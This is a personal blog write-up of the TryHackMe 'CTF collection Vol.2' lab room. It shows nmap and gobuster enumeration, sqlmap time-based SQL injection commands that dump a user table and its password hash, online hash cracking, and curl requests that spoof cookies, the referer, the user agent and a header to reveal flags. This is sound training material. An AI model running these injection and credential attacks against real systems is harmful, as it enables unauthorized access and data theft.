# NOTE: This was a blog from *vipin.xyz* see [this](https://www.vipin.xyz/blog/archive)

# CTF collection Vol.2 Writeup

My Writeup for this TryHackMe Room

Released: 2024-02-6

# 🚀 Opening Remarks

This is how I solved the [CTF collection Vol.2 Room](https://tryhackme.com/room/ctfcollectionvol2). **WARNING**: This contains solutions to every Easter egg. Please refrain from simply copying the steps to obtain the flag; instead, aim to learn from them. Additionally, these solutions were written as I solved them, providing insight into my thought process at the time for a more realistic experience. Hope you enjoy! :D

## 📡 Nmap Scan

- I started with a basic NMAP scan which is a typical first step.

```bash
❯ sudo nmap -sS -sV 10.10.152.207
Starting Nmap 7.94 ( https://nmap.org ) at 2024-02-04 20:57 EST
Nmap scan report for 10.10.152.207
Host is up (0.092s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Now we know ports 80 and 22 are open. Since Port 80 (HTTP) is open, let's access the webpage from the browser.

## 🌐 Accessing the website

- Upon accessing the website, we are greeted with an overwhelming mess.

![Image showing the website upon arrival](blog/ctfcollectionvol2pics/website1.png 'Fig.1')
<div style={{ textAlign: 'center' }}>
  <small>Fig.1</small>
</div>

- I don't see anything right off the bat so let's move on to a **Directory Search**!

## 🔍 Directory Search

- I chose to use *Gobuster* for this task, as I've found it to be the most effective tool for directory enumeration. (Update 05/20: I prefer Dirsearch instead)


```bash
❯ gobuster dir -u 10.10.152.207 -w /Users/vipin/tech/CTFs/wordlists/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.152.207
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /Users/vipin/tech/CTFs/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index                (Status: 200) [Size: 94328]
/login                (Status: 301) [Size: 314] [--> http://10.10.152.207/login/]
/button               (Status: 200) [Size: 39148]
/static               (Status: 200) [Size: 253890]
/cat                  (Status: 200) [Size: 62048]
/small                (Status: 200) [Size: 689]
/who                  (Status: 200) [Size: 3847428]
/robots               (Status: 200) [Size: 430]
/iphone               (Status: 200) [Size: 19867]
/game1                (Status: 301) [Size: 314] [--> http://10.10.152.207/game1/]
/egg                  (Status: 200) [Size: 25557]
/dinner               (Status: 200) [Size: 1264533]
/ty                   (Status: 200) [Size: 198518]
/ready                (Status: 301) [Size: 314] [--> http://10.10.152.207/ready/]
/saw                  (Status: 200) [Size: 156274]
/game2                (Status: 301) [Size: 314] [--> http://10.10.152.207/game2/]
/wel                  (Status: 200) [Size: 155758]
/free_sub             (Status: 301) [Size: 317] [--> http://10.10.152.207/free_sub/]
/nicole               (Status: 200) [Size: 367650]
/server-status        (Status: 403) [Size: 294]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```

- Now that we have all this information, let's start the first easter egg!

## 🥚 Easter Egg 1

- Started by checking out a couple of the directories we found in *Gobuster*. 

- The hint tells us to check out the "robots" and looking inside */robots* shows what seems to be a base64 string
. 
- If we put the base64 string over and over in Cyberchef with [this](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)From_Base64('A-Za-z0-9%2B/%3D',true,false)From_Base64('A-Za-z0-9%2B/%3D',true,false)From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=VmxOQ2NFbEZTV2RUUTBKS1NVVlpaMWRUUW01SlIxVm5ZVk5DUTBsR1VXZFRVMEpGU1VWcloxcDVRbGRKUjJ0blVXbENOa2xGYTJkU2FVSnVTVWRqWjFSVFFqVkpSVWxuVkhsQ1NrbEZZMmRrZVVKdVNVWmpaMVY1UWtKSlNHOW5VMU5DUmtsSE9HZGFlVUpwU1VWTloxRnBRbkpKUld0blVsTkNXa2xIWTJkVWVVSlVTVVZKWjJORFFrcEpSVmxuWVhsQ2JrbEdZMmRSZVVKRFNVVTRaMU5UUWtoSlNHTm5VRkVsTTBRbE0wUT0) recipe, it gives us this directory called *DesKel_secret_base* and when visiting that directory we get this...

![Image showing DesKel_secret_base](blog/ctfcollectionvol2pics/DesKelsecretbase.png 'Fig.2')
<div style={{ textAlign: 'center' }}>
  <small>Fig.2</small>
</div>

- How amusing 😑, but in */robots*, there seems to be a Hex string and when [decoded from Hex](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')) we get the first Easter.

## 🐣 Easter Egg 2

- The hint mentions the Base64 string we decoded before, which means that that wasn't joke after all!

- Checking out inspect element has a surprise for us!?

![Image showing the flag in inspect element](blog/ctfcollectionvol2pics/easteregg2.png 'Fig.3')
<div style={{ textAlign: 'center' }}>
  <small>Fig.3</small>
</div>

## 🍳 Easter Egg 3

- The hint says to use a directory buster with *common.txt* and luckily we already did. Let's take a look at some of the directories...

- Wait what the heck!? I just found the flag for Easter 19 in */small*, guess that another step done 🤷🏾‍♂️.

- And I did it again... I found the flag for Easter 13 in */ready* 🤦🏾‍♂️.

![Image showing me accidentally getting the flag](blog/ctfcollectionvol2pics/easteregg13.png 'Fig.4')
<div style={{ textAlign: 'center' }}>
  <small>Fig.4</small>
</div>

- Ironically I found the flags for 19 & 13, but not 3 🤦🏾‍♂️.

- Trying common.txt gives us the same results for the most part, but when looking at */login* source the flag is right there 🫠.

![Image showing me finding the flag in the source](blog/ctfcollectionvol2pics/easteregg3.png 'Fig.5')
<div style={{ textAlign: 'center' }}>
  <small>Fig.5</small>
</div>

- Guess I will continue tomorrow because it is a school night 😴.

## 🐥 Easter Egg 4

- It's the morning, so let's continue finishing up the room...

- The hint says "time-based sqli" so I will be using SQLmap to solve the challenge.

- I ran `python3 sqlmap.py  --dbs -r /Users/vipin/tech/CTFs/TryHackMe/ctfcolvol2/postreq.txt -D THM_f0und_m3 --tables`


```bash
❯ python3 sqlmap.py  --dbs -r /Users/vipin/tech/CTFs/TryHackMe/ctfcolvol2/postreq.txt -D THM_f0und_m3 --tables
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.8.2#stable}
|_ -| . [.]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[16:49:12] [INFO] retrieved:
[16:49:17] [INFO] adjusting time delay to 1 second due to good response times
nothing_inside
[16:50:19] [INFO] retrieved: user
Database: THM_f0und_m3
[2 tables]
+----------------+
| user           |
| nothing_inside |
+----------------+

[16:50:35] [INFO] fetched data logged to text files under '/Users/vipin/.local/share/sqlmap/output/10.10.121.142'

```

- Ok, let's look inside the *nothing_inside* table

```bash

Database: THM_f0und_m3
Table: nothing_inside
[1 column]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| Easter_4 | varchar(30) |
+----------+-------------+

Database: THM_f0und_m3
Table: user
[2 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| password | varchar(40) |
| username | varchar(30) |
+----------+-------------+

[16:57:10] [INFO] fetched data logged to text files under '/Users/vipin/.local/share/sqlmap/output/10.10.121.142'

[*] ending @ 16:57:10 /2024-02-05/
```

- Wow ok, let's look in the *Easter_4* Column and make another query (the google cyber cert really paying off rn)...

```bash
❯ python3 sqlmap.py  --dbs -r /Users/vipin/tech/CTFs/TryHackMe/ctfcolvol2/postreq.txt -D THM_f0und_m3 -t nothing_inside -C Easter_4 --sql-query "SELECT Easter_4 FROM nothing_inside"
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.8.2#stable}
|_ -| . [']     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

```

- YES!

![Image showing me finding the flag in the source](blog/ctfcollectionvol2pics/easteregg3.png 'Fig.6')
<div style={{ textAlign: 'center' }}>
  <small>Fig.6</small>
</div>
## 🪺 Easter 5

- There was a *user* table from the last easter, lets check that out now...

```bash

❯ python3 sqlmap.py  --dbs -r /Users/vipin/tech/CTFs/TryHackMe/ctfcolvol2/req2.txt -D THM_f0und_m3 -t user --columns
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.8.2#stable}
|_ -| . ["]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org


Database: THM_f0und_m3
Table: user
[2 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| password | varchar(40) |
| username | varchar(30) |
+----------+-------------+

Database: THM_f0und_m3
Table: nothing_inside
[1 column]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| Easter_4 | varchar(30) |
+----------+-------------+

```

- Ok, now let's look inside *password & username*, to look at that columnn I used this command ```python3 sqlmap.py  --dbs -r /Users/vipin/tech/CTFs/TryHackMe/ctfcolvol2/req2.txt -D THM_f0und_m3 -t user -C username,password --sql-query 'SELECT username,password FROM user'``` and below is the output

```bash

[*] DesKel, 05f3672ba34409136aa71b8d00070d1b
[*] Skidy, He is a nice guy, say hello for me

```

- Looks like we are PWD cracking 😁

![Image showing me cracking the password with hashes.com](blog/ctfcollectionvol2pics/hashctf1.png 'Fig.7')
<div style={{ textAlign: 'center' }}>
  <small>Fig.7</small>
</div>
- **Tip: Before cracking with hashcat, always check [hashes.com](https://hashes.com/en/decrypt/hash) to see if they can crack it**

- Entering the password in the login page gives us the flag.

## 🐤 Easter 6

- Looking in Burpsuite on the homepage shows us the flag.

![Image showing me finding the flag in burpsuite](blog/ctfcollectionvol2pics/easteregg6.png 'Fig.8')
<div style={{ textAlign: 'center' }}>
  <small>Fig.8</small>
</div>
- That was easy 🤷🏾‍♂️

## 🐔 Easter 7

- Viewing the cookies for the homepage shows us an `Invited` cookie with the value of `0`, changing it to 1 gives us the flag

![Image showing me getting the flag through cookies](blog/ctfcollectionvol2pics/easteregg7.png 'Fig.9')
<div style={{ textAlign: 'center' }}>
  <small>Fig.9</small>
</div>
## 🐓 Easter 8

- To solve, I made a curl request with `-A` and the user agent said in the hint to the server's IP

```bash
curl -A "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" http://10.10.185.145/a
```

![Image showing me getting the flag through curl](blog/ctfcollectionvol2pics/easteregg8.png 'Fig.10')
<div style={{ textAlign: 'center' }}>
  <small>Fig.10</small>
</div>
## 🍗 Easter 9

- When looking in */ready* source code through burpsuite, it shows the Easter 9 flag but it quickly redirects to show the Easter 13 flag.

![Image showing me getting the flag using burpsuite to capture it](blog/ctfcollectionvol2pics/easteregg9.png 'Fig.11')
<div style={{ textAlign: 'center' }}>
  <small>Fig.11</small>
</div>

- Using Burpsuite I captured the response quickly.

## 🥓 Easter 10

- Remember when we did that directory search, well it comes in handy. One of the directories I found was */free_sub*

- Now we need to use the THM website as a referrer like this ```curl --referer Referer_URL target_URL```

![Image showing me getting the flag through curl](blog/ctfcollectionvol2pics/easteregg10.png 'Fig.12')
<div style={{ textAlign: 'center' }}>
  <small>Fig.12</small>
</div>

## 🍖 Easter 11

- When clicking through the dinner option on the salad one it tells us that it prefer's an egg so making a curl request like this

```bash
❯ curl -X POST \
  http://10.10.185.145/ \
  --data 'dinner=egg&submit=submit'
  ```

- Gives us the flag :)

![Image showing me getting the flag through curl](blog/ctfcollectionvol2pics/easteregg11.png 'Fig.13')
<div style={{ textAlign: 'center' }}>
  <small>Fig.13</small>
</div>

## 🥩 Easter 12

- Last challenge I will solve today...

- In the homepages source, there is a file called jquery-9.1.2.js. Because the hint says something about a fake JS, I took a look at it...

![Image showing me looking at js files to find the flag](blog/ctfcollectionvol2pics/jquery-9.1.2.js.png 'Fig.14')
<div style={{ textAlign: 'center' }}>
  <small>Fig.14 *jquery-9.1.2.js*</small>
</div>

- When decoded [from Hex](https://gchq.github.io/CyberChef/#recipe=From_Hex('None')), the flag is clear as day

![Image showing me getting the flag from cyberchef](blog/ctfcollectionvol2pics/easteregg12.png 'Fig.15')
<div style={{ textAlign: 'center' }}>
  <small>Fig.15 *Decoded from Hex*</small>
</div>

## 🍔 Easter 13

- Back in Easter 3, I accidentally found this flag in */ready*

![Image showing me accidentally getting the flag](blog/ctfcollectionvol2pics/easteregg13.png 'Fig.16')
<div style={{ textAlign: 'center' }}>
  <small>Fig.16</small>
</div>

## 🌭 Easter 14

- In the homepage's source, there is a Base64 string in a comment.

![Image showing me finding a BASE64 string](blog/ctfcollectionvol2pics/easteregg14string.png 'Fig.17')
<div style={{ textAlign: 'center' }}>
  <small>Fig.17 *Base64 String*</small>
</div>

- Decoding it from Base64 and rendering the image with CyberChef gives us the flag.

![Image showing me finding the flag](blog/ctfcollectionvol2pics/easteregg14.png 'Fig.18')
<div style={{ textAlign: 'center' }}>
  <small>Fig.18 *Rendered Image*</small>
</div>

## 🌮 Easter 15

- This easter is a nice paper and pen challenge.

- I started by entering the alphabet in CAPS and the alphabet in lowercase into the box. Now I know what each number decodes to...

```txt

99 100 101 102 103 104 51 52 53 54 55 56 57 58 126 127 128 129 130 131 136 137 138 139 141
A   B   C   D   E   F   G  H  I  J  K  L  M  N  O   P   Q   R   S   T   U   V    W  X   Z

89 90 91 92 93 94 95 41 42 43 75 76 77 78 79 80 81 10 11 12 13 14 15 16 17 18
a   b  c  d  e  f  g  h  i  j  k  l  m  n  o  p  q  r  s  t  u  v  w  x  y  z

```

- Now all we have to do is manually decode the "hints" to get the flag.

![Image showing me solving the puzzle](blog/ctfcollectionvol2pics/easteregg15.png 'Fig.19')
<div style={{ textAlign: 'center' }}>
  <small>Fig.19</small>
</div>

- And Voila!

## 🌯 Easter 16

- Now we are playing */game2*, to solve we need to press all 3 buttons at the same time.

- When looking at Burp, it POST's ```button2=button2&submit=submit``` when the button is clicked. What if we made a cURL request to send a POST request for every button?

```bash
❯ curl -X POST \
  -d 'button1=button1&submit=submit' \
  -d 'button2=button2&submit=submit' \
  -d 'button3=button3&submit=submit' \
  http://10.10.224.131/game2/

<html>
        <head>
                <title>Game 2</title>
                <h1>Press the button simultaneously</h1>
        </head>
 <body>

 <form method="POST">
  <input type="hidden" name="button1" value="button1">
  <button name="submit" value="submit">Button 1</button>
 </form>

 <form method="POST">
                <input type="hidden" name="button2" value="button2">
                <button name="submit" value="submit">Button 2</button>
        </form>

 <form method="POST">
                <input type="hidden" name="button3" value="button3">
                <button name="submit" value="submit">Button 3</button>
        </form>
 Just temper the code and you are good to go. Easter 16: THM{REDACTED} </body>
</html>
```

## 🥙 Easter 17

- Looking in the page source, we find this script...

![Image showing me finding some script](blog/ctfcollectionvol2pics/pagesource17.png 'Fig.20')
<div style={{ textAlign: 'center' }}>
  <small>Fig.20</small>
</div>

- The hint says to decode from Bin -> Dec -> Hex -> Ascii. This is a straight forward challenge so no need to explain how to solve it.

## 🥗 Easter 18

- We need to make another POST request, once again I will use cURL.

```bash
╰─ curl -X POST \
  -H 'egg: Yes' \
  http://10.10.166.61/
```

- I ran the command above and I got the flag!!

![Image showing me getting the flag](blog/ctfcollectionvol2pics/easteregg18.png 'Fig.21')
<div style={{ textAlign: 'center' }}>
  <small>Fig.21 *cURL Result*</small>
</div>

## 🥪 Easter 19

- Back when I was solving Easter 3, I accidentally found the flag in */small*.

## 🗿 Easter 20

- The final stretch!

- We need to make a cURL request to */login* to login, the command I used is below.

```curl -X POST -d "username=DesKel&password=heIsDumb&submit=submit" http://10.10.166.61/```

![Image showing me getting the flag](blog/ctfcollectionvol2pics/easteregg20.png 'Fig.22')
<div style={{ textAlign: 'center' }}>
  <small>Fig.22</small>
</div>


# 💭 Final Thoughts

- This was a fun room and I enjoyed it. I learned some new tools such as Burp & SQLmap. The SQLmap challenge were the trickiest in my opinion, but overall the room was nice!

### MACHINE PWN'ED 😎

